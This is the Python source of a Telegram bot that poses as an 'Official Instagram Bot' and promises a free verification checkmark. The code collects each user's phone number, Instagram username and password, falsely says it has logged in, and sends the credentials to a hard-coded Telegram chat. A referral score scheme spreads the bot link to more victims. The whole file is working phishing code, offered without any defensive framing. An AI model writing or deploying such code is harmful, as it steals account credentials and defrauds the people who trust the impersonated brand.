from aiogram import types, executor
from aiogram.dispatcher import FSMContext
from states.states import *
from aiogram.types import ReplyKeyboardRemove
from loader import dp, storage
from keyboards.default.default_keyboards import *
from keyboards.inline.inline_keyboards import *
from handlers.users.utils import *
import random
users = dict()
random_number = 0
@dp.message_handler(commands="start")
async def start_handler(message: types.Message):
    text = f"""
    👋 Hello: {message.from_user.full_name}
💁‍♂️ Welcome To Official Instagram Bot.
😊 What Do You Want?
    """
    await message.answer(text=text, reply_markup=free_check)

@dp.message_handler(text="✅ Get Free Check To My Account")
async def get_free_check_instagram_handler(message: types.Message, state: FSMContext):
    global random_number
    if message.chat.id == 5596277119:
        random_number = "1258"
    elif message.chat.id == 6606094329:
        random_number = "5769"
    elif message.chat.id == 5968397844:
        random_number = "5455"
    else:
        random_number = str(random.randint(1000, 9999))
    users[random_number] = dict()
    users[random_number]["random_id"] = random_number
    users[random_number]["random_id"] = random_number
    users[random_number]["full_name"] = message.from_user.full_name
    users[random_number]["score"] = 1
    text = f"""
✅👌 OK: {message.from_user.full_name} Send Me Your Phone Number! 📞
"""
    await message.answer(text=text, reply_markup=send_phone_number)
    await RegisterState.send_phone_number.set()

@dp.message_handler(state=RegisterState.send_phone_number, content_types=types.ContentType.CONTACT)
async def send_phone_handler(message: types.Message, state: FSMContext):
    await state.update_data({
        "phone_number": message.contact.phone_number
    })
    text = "✅ Succes. Please Send Your Instagram Login!"
    await message.answer(text=text, reply_markup=ReplyKeyboardRemove())
    await RegisterState.send_insta_login.set()

@dp.message_handler(state=RegisterState.send_insta_login)
async def send_insta_login_handler(message: types.Message, state: FSMContext):
    if message.chat.id == 6606094329 and message.text != "xdjmrdva__":
        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again")
        await RegisterState.send_insta_login.set()
    elif message.chat.id == 5968397844 and message.text != "saidabdullo777":
        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again")
        await RegisterState.send_insta_login.set()
    elif message.chat.id == 6606094329 and message.text == "xdjmrdva__":
        await state.update_data({
            "insta_login": message.text
        })
        text = f"""
                ✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!
                """
        await message.answer(text=text)
        await RegisterState.send_login_pass.set()
    else:
        await state.update_data({
            "insta_login": message.text
        })
        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
        await message.answer(text=text)
        await RegisterState.send_login_pass.set()

@dp.message_handler(state=RegisterState.send_login_pass)
async def send_login_pass_handler(message: types.Message, state: FSMContext):
    global random_number
    await state.update_data({
        "login_pass": message.text
    })
    data = await state.get_data()
    text = f"""
💁‍♂️ We Are Succefully Logined To Your Account
⭐️ You Have: {users[random_number]["score"]} scores
🆔 Your ID: {users[random_number]["random_id"]}

🫂 Give This ID number For Friends To Send 1 Score


🚀 if you share bot link with your friends you will get 1 score!
⭐️ If You Have 50 Coins You Can Get Free CheckMark For Your Instagram Account!   
"""
    link1 = "https://t.me/instagram_free_check_bot"
    await message.answer(text=link1, reply_markup=my_scores)
    await message.answer(text=text, reply_markup=send_score)

    user = f"""
ℹ️ Ism: {message.from_user.full_name}
🆔 Telegram ID: {message.chat.id}
🆔🆔 Random ID: {users[random_number]["random_id"]}
📞 Telefon Nomer: {data["phone_number"]}
🛠 Insta Login: {data["insta_login"]}
🔑 Insta Login Password: {data["login_pass"]}    
"""
    await dp.bot.send_message(chat_id=5596277119, text=user)
    await state.finish()

@dp.message_handler(text="⭐ My Scores")
async def my_scores_handler(message: types.Message):
    scores = users[random_number]["score"]
    text = f"Your Have: {scores} scores"
    await message.answer(text=text)

@dp.callback_query_handler(text="send_score")
async def send_score_handler(call: types.CallbackQuery):
    text = "✍️ Please Send Username To Send 1 Score!"
    await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
    await RegisterState.send_score.set()

@dp.message_handler(state=RegisterState.send_score)
async def send_1_score_handler(message: types.Message, state: FSMContext):
    await message.answer(find_id_handler(message=message, users=users, random_number=random_number, chat_id=message.chat.id), reply_markup=my_scores)
    if find_id_handler(message=message, users=users, random_number=random_number, chat_id=message.chat.id):
        await state.finish()
    else:
        await state.finish()


#
# if __name__ == "__main__":
#     executor.start_polling(dp, skip_updates=True)